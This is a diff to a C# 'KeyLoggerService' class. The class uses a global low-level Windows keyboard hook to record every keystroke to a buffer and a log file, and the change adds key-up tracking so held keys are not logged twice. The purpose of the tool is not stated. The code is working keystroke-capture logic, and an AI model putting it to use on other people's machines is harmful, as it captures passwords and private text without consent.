@@ -76,8 +76,10 @@ public class KeyLoggerService
 
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
+    private const int WM_KEYUP = 0x0101; // Added KeyUp constant
 
     private static KeyLoggerService? _instance;
+    private readonly HashSet<Keys> _pressedKeys = new HashSet<Keys>(); // Track currently pressed keys
 
     [DllImport("user32.dll")]
     private static extern short GetKeyState(int nVirtKey);
@@ -96,22 +98,38 @@ public class KeyLoggerService
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
     {
-        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+        if (nCode >= 0)
         {
             int vkCode = Marshal.ReadInt32(lParam);
             var key = (Keys)vkCode;
             
-            if (_instance != null && _instance._isLogging)
+            if (wParam == (IntPtr)WM_KEYDOWN)
             {
-                string keyStr = ConvertKeyToString(key);
-                if (!string.IsNullOrEmpty(keyStr))
+                if (_instance != null && _instance._isLogging)
                 {
-                    lock (_instance._lock)
+                    // Check if key is already pressed
+                    if (!_instance._pressedKeys.Contains(key))
                     {
-                        _instance._logBuffer.Append(keyStr);
+                        _instance._pressedKeys.Add(key); // Mark as pressed
+
+                        string keyStr = ConvertKeyToString(key);
+                        if (!string.IsNullOrEmpty(keyStr))
+                        {
+                            lock (_instance._lock)
+                            {
+                                _instance._logBuffer.Append(keyStr);
+                            }
+                            // Ghi ra file ngay lập tức
+                            try { File.AppendAllText(_instance._logFilePath, keyStr); } catch { }
+                        }
                     }
-                    // Ghi ra file ngay lập tức
-                    try { File.AppendAllText(_instance._logFilePath, keyStr); } catch { }
+                }
+            }
+            else if (wParam == (IntPtr)WM_KEYUP)
+            {
+                if (_instance != null)
+                {
+                    _instance._pressedKeys.Remove(key); // Mark as released
                 }
             }
         }
